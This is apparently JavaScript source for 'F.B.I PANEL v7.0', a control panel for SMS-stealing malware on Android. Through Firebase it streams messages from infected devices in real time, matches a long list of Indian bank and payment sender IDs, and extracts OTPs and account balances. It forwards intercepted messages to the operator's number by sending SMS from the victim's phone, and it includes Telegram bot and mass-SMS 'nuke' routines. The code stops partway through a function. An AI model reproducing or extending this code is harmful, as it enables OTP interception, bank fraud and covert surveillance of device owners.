/* ═══════════════════════════════════════════════════════════
   F.B.I PANEL v7.0 — SSE Real-Time · Sub-500ms · Fast Forward
   ═══════════════════════════════════════════════════════════ */

var CFG = window.SPECTER || {};
var FB_URL='',FB_KEY='';
var allDevices=[],selDev=null,activeDeviceUid=null;
var allMsgs=[],mfMode='all',amfMode='all';
var pinV={},pinC={},noteC={},otpNoteC={};
var usedDevices={},usedDevicesKey='fbi_used_devices';
var deviceSimMap={},deviceSimKey='fbi_device_sims';
var _msgCache={};
var gridFilter='all';

/* ═══════ SPEED CONFIG — sab kuch fast ═══════ */
var POLL_FAST  = 250;    // messages fallback (SSE primary)
var POLL_DEV   = 1500;   // device list
var POLL_BG    = 300;    // background forward fallback
var POLL_BAL   = 5000;   // balance
var POLL_AM    = 2000;   // all msgs
var TG_POLL    = 120;    // telegram loop
var CLOUD_DEB  = 150;    // cloud save
var API_TIMEOUT = 6000;

var mPoll=null,dPoll=null,aPoll=null,bgPoll=null,balPoll=null;
var curMsgDev=null,lastKeys=new Set();
var amCache={},amFetch={};
var amAll=[],amFilt=[],amCount=0,amObs=null,amLoading=false,amLoaded=false,AM=80;

var nukeRunning=false,nukeSent=0,nukeFail=0,nukeTotal=0,_nukeActive=0,_nukeStartTime=0,_nukeStatsTmr=null;
var _nukePool=80;
var fbInstances=[];
var _mergeDebTimer=null,_lastMergeSig='';

var userConfig = JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG || {}));
var blobId = null;
var cloudSaveTmr = null;
var tgRunning=false,tgPollLoop=false,tgLastUpdateId=0;
var forwardTracker={};
var tgDiagnostics = {lastError:'', lastUpdate:0, updateCount:0, webhookInfo:'', botInfo:null};

/* ═══════ SSE STREAMS ═══════ */
var _msgStream=null, _msgStreamUid=null, _msgStreamDev=null;
var _sseFailCount={};

/* ═══════ BALANCE CACHE ═══════ */
var deviceBalances={};
var _balTickRunning=false;
try{ var _sb0=localStorage.getItem('fbi_device_balances'); if(_sb0) deviceBalances=JSON.parse(_sb0)||{}; }catch(e){}

/* ═══════════════════════════════════════════════════════════
   🏦 BANK SENDER IDs
   ═══════════════════════════════════════════════════════════ */
var BANK_SENDERS = {
  'HDFCBK':'HDFC Bank','HDFCBN':'HDFC Bank','HDFC':'HDFC Bank','HDFCCC':'HDFC Card',
  'SBIINB':'SBI','SBIMSG':'SBI','SBIUPI':'SBI','SBIPSG':'SBI','SBIMSM':'SBI','SBIBNK':'SBI','SBICRD':'SBI Card','SBICARD':'SBI Card',
  'ICICIB':'ICICI','ICICIM':'ICICI','ICICIBNK':'ICICI','ICICRD':'ICICI Card','ICICIC':'ICICI Card',
  'AXISBK':'Axis Bank','AXISBNK':'Axis Bank','AXISB':'Axis Bank','AXISCR':'Axis Card','AXISCD':'Axis Card',
  'KOTAKB':'Kotak','KOTAKM':'Kotak','KOTAK':'Kotak','KOTAKC':'Kotak Card','KOTCRD':'Kotak Card',
  'PNBSMS':'PNB','PNBMSG':'PNB','PNBBNK':'PNB',
  'BOBSMS':'BOB','BOBIND':'BOB','BOBBNK':'BOB','BARODA':'Bank of Baroda','BOBBAR':'Bank of Baroda',
  'CANBNK':'Canara Bank','CANBK':'Canara Bank','CANBNKL':'Canara Bank',
  'UNIONB':'Union Bank','UBIINB':'Union Bank',
  'IDBIBK':'IDBI','IDBICB':'IDBI','IDBIMS':'IDBI',
  'YESBNK':'Yes Bank','YESBK':'Yes Bank',
  'INDUSB':'IndusInd','INDUSM':'IndusInd',
  'IDFCFB':'IDFC First','IDFCBK':'IDFC First',
  'FEDERL':'Federal Bank','FEDBNK':'Federal Bank','FEDBK':'Federal Bank',
  'RBLCRD':'RBL Bank','RBLBNK':'RBL Bank',
  'AUBANK':'AU Bank','AUSFB':'AU Small Finance',
  'BOIIND':'Bank of India','BOIBNK':'Bank of India',
  'CENTBK':'Central Bank','CBIBNK':'Central Bank',
  'KVBSMS':'Karur Vysya','KARURV':'Karur Vysya','KARBNK':'Karnataka Bank',
  'INDIANB':'Indian Bank','INDBNK':'Indian Bank',
  'UCOBNK':'UCO Bank','UCOB':'UCO Bank',
  'PSBANK':'Punjab & Sind','PSBSMS':'Punjab & Sind',
  'BANDHN':'Bandhan Bank','DBSBNK':'DBS Bank',
  'CITIBN':'Citi Bank','CITIBK':'Citi Bank',
  'SCBANK':'Standard Chartered','SCB':'Standard Chartered',
  'HSBCIN':'HSBC','HSBCBK':'HSBC',
  'AMEXIN':'Amex','AMEX':'Amex','AMERICANEXPRESS':'Amex',
  'IPBMSG':'India Post Bank','IPBBNK':'India Post',
  'UJJIVN':'Ujjivan','UJJIVSF':'Ujjivan SF',
  'EQUITB':'Equitas Bank','EQUIT':'Equitas',
  'SURYOD':'Suryoday','SURYO':'Suryoday',
  'UTKARB':'Utkarsh Bank','UTKARS':'Utkarsh',
  'SARSWT':'Saraswat Bank','COSMSB':'Cosmos Bank','NKGSBB':'NKGSB Bank',
  'SIBLTD':'South Indian Bank','SIBBNK':'South Indian',
  'TMBLTD':'Tamilnad Mercantile','TMBANK':'Tamilnad Mercantile',
  'CUBLTD':'City Union Bank','CUBANK':'City Union Bank',
  'DCBBLK':'DCB Bank','DCBANK':'DCB Bank',
  'NAINBK':'Nainital Bank','PGBANK':'Punjab Gramin','BAROUP':'Baroda UP Bank',
  'MAHABK':'Bank of Maharashtra','BOMBNK':'Bank of Maharashtra',
  'JKBANK':'J&K Bank','JKB':'J&K Bank',
  'OBCBNK':'OBC','OBCMSG':'OBC','ANDBBK':'Andhra Bank','ANDHRA':'Andhra Bank',
  'CORPBK':'Corporation Bank','DENABK':'Dena Bank',
  'VIJBNK':'Vijaya Bank','VIJAYA':'Vijaya Bank',
  'PALLAV':'Pallavan Grama','PALLAVN':'Pallavan',
  'DHANBK':'Dhanlaxmi','DHANLX':'Dhanlaxmi',
  'LVBBNK':'Lakshmi Vilas','LAKSMI':'Lakshmi Vilas',
  'TJSB':'TJSB Bank','ABHYUD':'Abhyudaya Bank',
  'BHARAT':'Bharat Coop','BHARATCB':'Bharat Coop','SARASWAT':'Saraswat Coop',
  'TNCB':'Tamil Nadu Coop','TNSB':'Tamil Nadu Coop',
  'APCOB':'APCOB','APGB':'AP Grameena','TGGB':'Telangana Grameena',
  'KGB':'Kerala Gramin','KLGB':'Kerala Gramin','BGB':'Bangiya Gramin',
  'PBGB':'Paschim Banga Gramin','RMGB':'Rajasthan Marudhara','BRGB':'Baroda Rajasthan',
  'CGB':'Chhattisgarh Gramin','MPGB':'MP Gramin','MGB':'MP Gramin',
  'UPGB':'UP Gramin','HGB':'Haryana Gramin','JKGB':'J&K Grameen',
  'PGBG':'Punjab Gramin','HPGB':'HP Gramin','HIMGB':'HP Gramin',
  'UKGB':'Uttarakhand Gramin','ARGB':'Arunachal Gramin','ASGB':'Assam Gramin',
  'MNGB':'Manipur Gramin','MGBI':'Manipur Gramin','MZGB':'Mizoram Gramin',
  'NLGB':'Nagaland Gramin','TRGB':'Tripura Gramin','SKGB':'Sikkim Gramin',
  'ODGB':'Odisha Gramin','OGB':'Odisha Gramin','JHGB':'Jharkhand Gramin',
  'BGBB':'Bihar Gramin','BKGB':'Bihar KGB',
  'PAYTMB':'Paytm','PAYTM':'Paytm','PYTMBK':'Paytm Bank','PAYTMPB':'Paytm Payments Bank',
  'PHONEPE':'PhonePe','PPBL':'PhonePe','PPB':'PhonePe',
  'AIRTEL':'Airtel','AIRBNK':'Airtel Payments Bank','AMOB':'Airtel Money',
  'JIOPB':'Jio Payments Bank','JIOBPB':'Jio Payments Bank','JIOB':'Jio',
  'FINO':'Fino','FINOPB':'Fino Payments Bank','NSDLPB':'NSDL Payments Bank',
  'INDIA1':'India1 Payments Bank','FIPB':'Fino Payments','IPPB':'India Post Payments Bank','MOMOPB':'Momo',
  'BAJAJF':'Bajaj Finserv','BFL':'Bajaj Finance','BAJAJ':'Bajaj','BAJAJFIN':'Bajaj Finance',
  'FULLTN':'Fullerton','FULERT':'Fullerton','HDBFS':'HDB Financial',
  'TATACP':'Tata Capital','TATCAP':'Tata Capital','TATACAP':'Tata Capital',
  'MUTHOT':'Muthoot','MUTH':'Muthoot','MUTHOOTF':'Muthoot',
  'ABCAPL':'Aditya Birla Capital','ABCL':'Aditya Birla',
  'CHOLAM':'Cholamandalam','CHOLA':'Chola','CHOLAF':'Chola Finance',
  'SHRIRM':'Shriram Finance','SHRIRF':'Shriram','SHRIRAM':'Shriram',
  'IIFL':'IIFL','IIFLBK':'IIFL Finance',
  'LNTFIN':'L&T Finance','LTFIN':'L&T Finance','LTF':'L&T Finance',
  'MANAPP':'Manappuram','MFL':'Manappuram','MANAPPU':'Manappuram',
  'SUNDAR':'Sundaram','SFC':'Sundaram Finance',
  'MAHIND':'Mahindra Finance','MMFSL':'Mahindra Finance','MAHFIN':'Mahindra',
  'HEROFI':'Hero FinCorp','HEROFINC':'Hero FinCorp','TVS':'TVS Credit','TVSCRD':'TVS Credit',
  'HDFCLT':'HDFC Ltd','HDFCLTD':'HDFC Ltd','ICICIHF':'ICICI HFC','ICICIH':'ICICI Home',
  'LICHF':'LIC Housing','LICHFL':'LIC Housing','PNBHF':'PNB Housing','PNBHFL':'PNB Housing',
  'ADITYAB':'Aditya Birla Finance','ABFL':'Aditya Birla Finance',
  'CREDBK':'CRED','CRED':'CRED','CREDCL':'CRED',
  'SLICEB':'Slice','SLICEP':'Slice','SLICE':'Slice',
  'NAVI':'Navi','NAVIBK':'Navi','NAVILOAN':'Navi',
  'KREDIT':'KreditBee','KBEE':'KreditBee','KBBANK':'KreditBee',
  'MONEYT':'MoneyTap','MONEYVIEW':'MoneyView','MVAPP':'MoneyView',
  'FIBE':'Fi Money','FIMONEY':'Fi','JUPITE':'Jupiter','JUPBNK':'Jupiter',
  'WAZIRX':'WazirX','COINDCX':'CoinDCX','DHAN':'Dhan','ZERODHA':'Zerodha',
  'GROWW':'Groww','UPSTOX':'Upstox','ANGELB':'Angel One','ANGEL':'Angel One',
  'ICICID':'ICICI Direct','KOTAKSEC':'Kotak Securities','HDFCSEC':'HDFC Securities',
  'MOTILAL':'Motilal Oswal','MOSL':'Motilal Oswal','AXISDIR':'Axis Direct','SBISEC':'SBI Securities',
  'PAISAB':'Paisabazaar','PAISA':'Paisabazaar','BANKBAZ':'BankBazaar','POLICYB':'PolicyBazaar',
  'CLEARTAX':'ClearTax','CLEAR':'ClearTax','ZAGGLE':'Zaggle','PLUXEE':'Pluxee','SODEXO':'Sodexo',
  'PAYU':'PayU','RAZORP':'Razorpay','RZRPAY':'Razorpay','CASHFRE':'Cashfree','CFREE':'Cashfree',
  'INSTAMO':'Instamojo','BILLDESK':'BillDesk','BILLDSK':'BillDesk','CCAVENUE':'CCAvenue',
  'MPESA':'M-Pesa','VODAFON':'Vodafone M-Pesa',
  'CIBIL':'CIBIL','CIBILT':'CIBIL','TRANSUN':'TransUnion','TUCIBIL':'TransUnion',
  'EXPERIA':'Experian','EXPRN':'Experian','CRIF':'CRIF','CRIFHS':'CRIF',
  'EQUIFAX':'Equifax','EQFX':'Equifax',
  'LICIND':'LIC','LICI':'LIC','LICOFI':'LIC',
  'HDFCERGO':'HDFC Ergo','HDFCLIFE':'HDFC Life',
  'ICICIPRU':'ICICI Prudential','ICICILOM':'ICICI Lombard',
  'SBILIFE':'SBI Life','AXISMAX':'Max Life','MAXLIF':'Max Life',
  'BAJAJALZ':'Bajaj Allianz','BAJAJAL':'Bajaj Allianz',
  'TATAAIG':'Tata AIG','TATAAI':'Tata AIG',
  'STARHE':'Star Health','NIVA':'Niva Bupa','NIVABUPA':'Niva Bupa',
  'CAREHE':'Care Health','NEWIN':'New India Assurance',
  'ORIENTAL':'Oriental Insurance','NATIOI':'National Insurance',
  'UNITEDI':'United India','RELIANC':'Reliance General',
  'ACKO':'Acko','DIGIT':'Go Digit','GODIGIT':'Go Digit',
  'FUTUREG':'Future Generali','FUTGEN':'Future Generali',
  'KOTAKL':'Kotak Life','PNBLIFE':'PNB MetLife','PNBMET':'PNB MetLife'
};

var BANK_BAL_KEYWORDS = ['avl bal','avail bal','available bal','avbl bal','avail. bal','avl. bal','avlbal','availbal',
  'ledger bal','book bal','closing bal','available balance','avl balance','avlbalance',
  'bal:','bal -','bal is','bal rs','bal inr','bal. rs','bal. inr','balance:','balance is','balance -',
  'balance rs','balance inr','bal ₹','balance ₹','ac bal','acc bal','a/c bal','account balance'];
var BANK_TXN_KEYWORDS = ['debited','credited','withdrawn','deposited','spent','transferred','paid to','received from',
  'txn','transaction','ref no','ref. no','utr','imps','neft','rtgs','upi','atm','pos ','emi','payment of',
  'debited by','credited by','dr.','cr.','txn id','txn ref'];
var BANK_PROMO_KEYWORDS = ['apply now','pre-approved','pre approved','loan offer','limited period',
  'click here to apply','avail loan','personal loan offer','credit card offer','apply for',
  'congratulations','congrats','winner','you have won','lucky','cashback offer','you are eligible',
  'get up to','interest rate','festive offer','discount of','flat ₹','flat rs','shop now','buy now',
  'sale ends','limited time','last chance','exclusive offer','hurry','grab now','don\'t miss'];

function _normSender(s){if(!s)return '';s=String(s).toUpperCase();s=s.replace(/^(VM|AD|AX|TM|AT|BX|JD|CP|MD|MM|TA|SD|AA|XX|GV|AJ|DN|SG|BS|BW|UK|EQ|DT|VK|JK|RK|IM|IP)-/,'');s=s.replace(/-(S|P|T|G|N|A|D|B|R|L|H|M|Q|E|F|K|U|W|X|Y|Z)$/,'');return s.replace(/[^A-Z0-9]/g,'');}
function detectBank(sender){var s=_normSender(sender);if(!s)return null;for(var k in BANK_SENDERS){if(s.indexOf(k)!==-1)return {name:BANK_SENDERS[k],key:k};}return null;}
function isBankingSms(sender,message){
  var bank=detectBank(sender);if(!bank)return null;
  var m=String(message||'').toLowerCase();
  var isPromo=false;for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(m.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}
  var hasBal=false,hasTxn=false;
  for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(m.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasBal=true;break;}}
  for(var t=0;t<BANK_TXN_KEYWORDS.length;t++){if(m.indexOf(BANK_TXN_KEYWORDS[t])!==-1){hasTxn=true;break;}}
  var hasOtp=/\botp\b|one time password|one-time password|verification code/i.test(m);
  if(isPromo&&!hasBal&&!hasTxn&&!hasOtp)return null;
  if(hasBal||hasTxn||hasOtp)return bank;
  return null;
}

/* ═══════════ INIT ═══════════ */
loadUsedDevices();loadDeviceSims();loadForwardTracker();initCloudConfig();

function loadUsedDevices(){try{var r=localStorage.getItem(usedDevicesKey);if(r)usedDevices=JSON.parse(r)||{};}catch(e){}}
function saveUsedDevices(){try{localStorage.setItem(usedDevicesKey,JSON.stringify(usedDevices));}catch(e){}}
function loadDeviceSims(){try{var r=localStorage.getItem(deviceSimKey);if(r)deviceSimMap=JSON.parse(r)||{};}catch(e){}}
function saveDeviceSims(){try{localStorage.setItem(deviceSimKey,JSON.stringify(deviceSimMap));}catch(e){}}
function loadForwardTracker(){try{var r=localStorage.getItem('fbi_forward_tracker');if(r)forwardTracker=JSON.parse(r)||{};}catch(e){}}
function saveForwardTracker(){try{localStorage.setItem('fbi_forward_tracker',JSON.stringify(forwardTracker));}catch(e){}}

/* ═══════════ CLOUD CONFIG ═══════════ */
async function initCloudConfig(){
  try{var cached=localStorage.getItem(CFG.LS_CACHE);if(cached){var parsed=JSON.parse(cached);userConfig=Object.assign({},CFG.DEFAULT_CONFIG,parsed);}}catch(e){}
  try{
    blobId=localStorage.getItem(CFG.LS_BLOB);
    if(blobId){
      updateCloudStatus('Fetching cloud config…');
      var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{signal:AbortSignal.timeout(API_TIMEOUT)});
      if(r.ok){var remote=await r.json();if(remote&&typeof remote==='object'){userConfig=Object.assign({},CFG.DEFAULT_CONFIG,remote);cacheConfigLocal();updateCloudStatus('☁ Synced from cloud');}}
    } else {await createCloudBlob();}
  }catch(e){updateCloudStatus('⚠ Cloud offline — using local');}
  fetchBotUsername();
  if(userConfig.enabled!==false&&userConfig.botEnabled!==false&&userConfig.channelId){setTimeout(startTelegramBot,300);}
}
async function createCloudBlob(){
  try{
    var r=await fetch(CFG.BLOB_BASE,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(API_TIMEOUT)});
    if(!r.ok)return;
    var loc=r.headers.get('Location')||r.headers.get('location');
    if(loc){var parts=loc.split('/');blobId=parts[parts.length-1];localStorage.setItem(CFG.LS_BLOB,blobId);updateCloudStatus('☁ Cloud config created');}
  }catch(e){updateCloudStatus('⚠ Cloud unavailable');}
}
function cacheConfigLocal(){try{localStorage.setItem(CFG.LS_CACHE,JSON.stringify(userConfig));}catch(e){}}
function updateCloudStatus(msg,cls){var el=document.getElementById('cloudStatus');if(el){el.textContent=msg;el.className='settings-status '+(cls||'');}}
async function saveCloudConfig(){
  cacheConfigLocal();
  if(!blobId){await createCloudBlob();return;}
  try{var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(API_TIMEOUT)});if(r.ok)updateCloudStatus('☁ Saved '+new Date().toLocaleTimeString());}catch(e){updateCloudStatus('⚠ Save failed — cached locally');}
}
function debouncedCloudSave(){if(cloudSaveTmr)clearTimeout(cloudSaveTmr);cloudSaveTmr=setTimeout(saveCloudConfig,CLOUD_DEB);}
function forceCloudSave(){saveCloudConfig();toast('☁ Cloud save triggered');}
async function resetCloudConfig(){if(!confirm('Reset all cloud settings?'))return;userConfig=JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG));cacheConfigLocal();await saveCloudConfig();toast('🗑 Config reset');populateSettingsUI();}

/* ═══════════ FIREBASE CORE ═══════════ */
async function fbGet(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{signal:AbortSignal.timeout(API_TIMEOUT)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
async function fbSet(p,d,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
async function fbDel(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'DELETE'});if(!r.ok)throw new Error('HTTP '+r.status);}

/* ═══════════ CENTRAL SMS SENDER (fire-and-forget capable) ═══════════ */
async function sendSmsViaDevice(dev, sim, to, message, tag){
  if(!dev){console.error('[SMS] No device');return {ok:false,error:'no device'};}
  var path='clients/'+dev.id+'/webhookEvent/sendSms';
  var url=(dev._fbUrl||FB_URL);
  var key=(dev._fbKey!==undefined?dev._fbKey:FB_KEY);
  var payload={from:sim,to:to,message:message,isSended:false};
  var t0=performance.now();
  try{
    var fullUrl=url+'/'+path+'.json'+(key?'?auth='+key:'');
    var r=await fetch(fullUrl,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true});
    var dt=(performance.now()-t0).toFixed(0);
    if(!r.ok){
      var txt='';try{txt=await r.text();}catch(e){}
      console.error('[SMS]['+tag+'] ✗ HTTP '+r.status+' in '+dt+'ms — '+txt);
      return {ok:false,error:'HTTP '+r.status+' '+txt};
    }
    console.log('[SMS]['+tag+'] ✓ Sent in '+dt+'ms → '+dev.name+' SIM'+sim);
    return {ok:true};
  }catch(e){
    console.error('[SMS]['+tag+'] ✗ Exception: '+e.message);
    return {ok:false,error:e.message};
  }
}

/* Fire-and-forget version (no await) */
function sendSmsFireAndForget(dev, sim, to, message, tag){
  if(!dev)return;
  var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
  var body=JSON.stringify({from:sim,to:to,message:message,isSended:false});
  var t0=performance.now();
  return fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true})
    .then(function(r){
      var dt=(performance.now()-t0).toFixed(0);
      if(r.ok)console.log('[SMS-FF]['+tag+'] ✓ '+dt+'ms → '+dev.name);
      else console.warn('[SMS-FF]['+tag+'] ✗ '+r.status+' '+dt+'ms');
      return r.ok;
    })
    .catch(function(e){console.warn('[SMS-FF]['+tag+'] ✗ '+e.message);return false;});
}

/* ═══════════ CONNECTION ═══════════ */
function connect(){
  var url=document.getElementById('fbUrl').value.trim().replace(/\/+$/,'');
  if(!url){showErr('Enter your Firebase URL');return;}
  FB_URL=url;
  document.getElementById('setup').style.display='none';
  document.getElementById('panel').style.display='flex';
  loadDevs();startDP();startBgForwardPoll();startBalancePoll();
  setTimeout(function(){fbRegisterPrimary();},200);
  if(userConfig.firebases&&userConfig.firebases.length)setTimeout(loadFirebasesFromConfig,500);
}
function showErr(m){var e=document.getElementById('serr');e.textContent=m;e.style.display='block';setTimeout(function(){e.style.display='none';},4000);}
function disconnect(){
  FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};amCache={};amAll=[];amFilt=[];amLoaded=false;
  stopMP();stopDP();stopAP();stopTelegramBot();stopBgForwardPoll();stopBalancePoll();stopMsgStream();
  document.getElementById('panel').style.display='none';
  document.getElementById('setup').style.display='flex';
}

/* ═══════════════════════════════════════════════════════════
   🔥 SSE STREAM — Real-time message detection
   ═══════════════════════════════════════════════════════════ */
function startMsgStream(dev){
  if(!dev)return;
  var uid=(dev._fbId||'primary')+'|||'+dev.id;
  if(_msgStreamUid===uid&&_msgStream&&_msgStream.readyState===1)return;
  if(_sseFailCount[uid]&&_sseFailCount[uid]>3)return; // too many fails, skip
  stopMsgStream();
  _msgStreamUid=uid;_msgStreamDev=dev;
  
  var fbUrl=dev._fbUrl||FB_URL;
  var fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  var url=fbUrl+'/messages/'+dev.id+'.json'+(fbKey?'?auth='+fbKey:'');
  
  try{
    _msgStream=new EventSource(url);
    _msgStream.onopen=function(){
      console.log('[SSE] ✓ Connected for '+dev.name);
      _sseFailCount[uid]=0;
    };
    _msgStream.onerror=function(){
      _sseFailCount[uid]=(_sseFailCount[uid]||0)+1;
      console.warn('[SSE] ✗ Error #'+_sseFailCount[uid]+' for '+dev.name+' — fallback polling');
    };
    _msgStream.addEventListener('put',function(ev){
      try{
        var d=JSON.parse(ev.data);
        if(!d||!d.path)return;
        var path=String(d.path);
        if(path==='/')return;
        var parts=path.replace(/^\//,'').split('/');
        var key=parts[0];
        if(!key||parts.length>1)return;
        var data=d.data;
        if(!data||typeof data!=='object')return;
        _handleStreamMsg(dev,key,data);
      }catch(e){console.warn('[SSE] parse err',e);}
    });
    _msgStream.addEventListener('patch',function(ev){
      try{
        var d=JSON.parse(ev.data);
        if(!d||!d.path)return;
        var parts=String(d.path).replace(/^\//,'').split('/');
        var key=parts[0];
        if(!key)return;
        var data=d.data;
        if(!data||typeof data!=='object')return;
        _handleStreamMsg(dev,key,data);
      }catch(e){}
    });
  }catch(e){console.error('[SSE] init err',e);}
}
function stopMsgStream(){
  if(_msgStream){try{_msgStream.close();}catch(e){}_msgStream=null;_msgStreamUid=null;_msgStreamDev=null;}
}

function _handleStreamMsg(dev,key,data){
  var t0=performance.now();
  var msg=parseMsgSingle(key,data);
  if(!msg)return;
  
  var cacheKey=(dev._fbId||'primary')+'|||'+dev.id;
  var cached=_msgCache[cacheKey]||[];
  // Dedup
  for(var i=0;i<cached.length;i++)if(cached[i].key===key){ /* update */ cached[i]=msg; break; }
  if(i>=cached.length){ cached.unshift(msg); if(cached.length>200)cached.length=200; }
  _msgCache[cacheKey]=cached;
  amCache[dev.id]=cached;
  amFetch[dev.id]=Date.now();
  
  // Update UI if device is open
  if(selDev&&selDev.id===dev.id){
    allMsgs=cached;
    lastKeys.add(key);
    updCnt();
    filterActiveMsgs();
    renderBankPane();
    var otp=_extractOtp(msg.message);
    if(otp&&otp!==_lastOtp)otpShow(otp,msg.sender);
  }
  
  // ⚡ INSTANT forward (fire-and-forget, no await)
  if(msg.type==='incoming')_instantForward(dev,msg);
  
  // 💰 Instant balance detect
  if(msg.type==='incoming'){
    var bal=extractLastBalance([msg]);
    if(bal){
      deviceBalances[dev.id]=bal;
      try{localStorage.setItem('fbi_device_balances',JSON.stringify(deviceBalances));}catch(e){}
      renderGrid();
      if(selDev&&selDev.id===dev.id)refreshDeviceModal();
    }
  }
  
  var dt=(performance.now()-t0).toFixed(0);
  console.log('[SSE] msg '+key+' processed in '+dt+'ms → '+dev.name);
}

/* ⚡ Instant forward — zero wait */
function _instantForward(dev,msg){
  if(userConfig.forwardEnabled===false)return;
  var myNum=userConfig.myNumber;
  if(!myNum)return;
  var mode=userConfig.forwardMode||'all';
  if(mode==='banking'&&!isBankingSms(msg.sender,msg.message))return;
  if(!msg.message||msg.message.trim()===''||msg.message.trim()==='(no body)')return;
  
  var sim=deviceSimMap[dev.id]||1;
  console.log('[⚡FWD] Instant → '+myNum+' via '+dev.name+' SIM'+sim);
  sendSmsFireAndForget(dev,sim,myNum,msg.message.trim(),'instant').then(function(ok){
    if(ok)toast('📤 Forwarded → '+myNum);
  });
}

function parseMsgSingle(key,m){
  var message='',sender='',dateTime='',type='incoming';
  if(typeof m==='string'){message=m;sender='Unknown';}
  else if(typeof m==='object'){
    message=m.message||m.body||m.messageBody||m.text||m.msg||m.content||m.sms||m.Body||m.Message||'';
    var ps=m.sender||m.from||m.phoneNumber||m.phone||m.number||m.source||m.originator||m.from_number;
    var ads=m.address||m.originatingAddress||m.senderAddress||m.remoteAddress||m.peerAddress;
    var ids=m.senderId||m.senderid||m.shortCode||m.short_code||m.sender_id;
    sender=String(ps||ads||ids||'').trim();
    if(!sender||sender==='null'||sender==='undefined'||sender==='0')sender='';
    if(!sender){
      var keys=Object.keys(m);
      for(var ki=0;ki<keys.length;ki++){
        var kk=keys[ki],vv=String(m[kk]||'').trim();
        if(/^\+?\d{5,15}$/.test(vv)&&kk!=='type'&&kk!=='msgType'&&kk!=='messageType'){sender=vv;break;}
      }
    }
    if(!sender)sender='Unknown';
    dateTime=m.dateTime||m.date||m.time||m.timestamp||m.createdAt||m.receivedAt||m.sentAt||m.dateReceived||m.dateSent||'';
    var rt=String(m.type||m.direction||m.msgType||m.messageType||'');
    type=(rt==='2'||rt.toLowerCase().includes('out')||rt.toLowerCase().includes('sent'))?'outgoing':'incoming';
  }
  if(!message&&!sender)return null;
  return{key:key,message:message||'(no body)',sender:sender||'Unknown',dateTime:dateTime,type:type,_ts:parseDT(dateTime)};
}

/* ═══════════ POLLERS (fast fallback) ═══════════ */
function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return;try{
  var d=await fbGet('clients');var nD=parseDevs(d);
  nD.forEach(function(dev){dev._fbId='primary';dev._fbLabel='Primary';dev._fbUrl=FB_URL;dev._fbKey=FB_KEY;});
  var prev=allDevices.filter(function(x){return(x._fbId||'primary')==='primary';}).length;
  allDevices=allDevices.filter(function(x){return(x._fbId||'primary')!=='primary';});
  allDevices=nD.concat(allDevices);
  if(nD.length!==prev||fbInstances.length>0){renderStats();renderGrid();}
  if(selDev){var up=allDevices.find(function(x){return x.id===selDev.id;});if(up){selDev=up;refreshDeviceModal();}}
}catch(e){}},POLL_DEV);}
function stopDP(){if(dPoll){clearInterval(dPoll);dPoll=null;}}

function startMP(id){
  stopMP();
  curMsgDev=id;
  var dev=allDevices.find(function(d){return d.id===id;});
  // Start SSE for real-time
  if(dev)startMsgStream(dev);
  // Initial fetch
  pollMsgs(id);
  // Fallback fast poll (skips if SSE alive)
  mPoll=setInterval(function(){
    if(selDev&&selDev.id===id){
      var streamAlive=_msgStream&&_msgStream.readyState===1;
      if(!streamAlive)pollMsgs(id);
    }
  },POLL_FAST);
}
function stopMP(){if(mPoll){clearInterval(mPoll);mPoll=null;}curMsgDev=null;stopMsgStream();}

function startAP(){stopAP();aPoll=setInterval(function(){if(document.getElementById('allMsgsModal').classList.contains('open'))pollAllFresh();},POLL_AM);}
function stopAP(){if(aPoll){clearInterval(aPoll);aPoll=null;}}
function setupObs(){killObs();var s=document.getElementById('amSentinel');if(!s)return;amObs=new IntersectionObserver(function(e){if(e[0].isIntersecting)renderPage();},{rootMargin:'400px'});amObs.observe(s);}
function killObs(){if(amObs){amObs.disconnect();amObs=null;}}

/* ═══════════ BACKGROUND FORWARD POLLER ═══════════ */
function startBgForwardPoll(){
  stopBgForwardPoll();
  bgPoll=setInterval(bgForwardTick,POLL_BG);
  console.log('[BGPoll] Started ('+POLL_BG+'ms)');
}
function stopBgForwardPoll(){if(bgPoll){clearInterval(bgPoll);bgPoll=null;console.log('[BGPoll] Stopped');}}

async function bgForwardTick(){
  if(!FB_URL)return;
  if(userConfig.forwardEnabled===false)return;
  if(!userConfig.myNumber)return;

  var dev=null;
  if(activeDeviceUid){
    var parts=activeDeviceUid.split('|||');
    dev=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});
  }
  if(!dev){dev=allDevices.find(function(d){return d.status;});}
  if(!dev)return;
  if(!dev.status)return;
  
  // Skip if SSE already handling this device
  var uid=(dev._fbId||'primary')+'|||'+dev.id;
  if(_msgStreamUid===uid&&_msgStream&&_msgStream.readyState===1)return;

  try{
    var fbUrl=dev._fbUrl||FB_URL;
    var fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
    var auth=fbKey?'?auth='+fbKey+'&':'?';
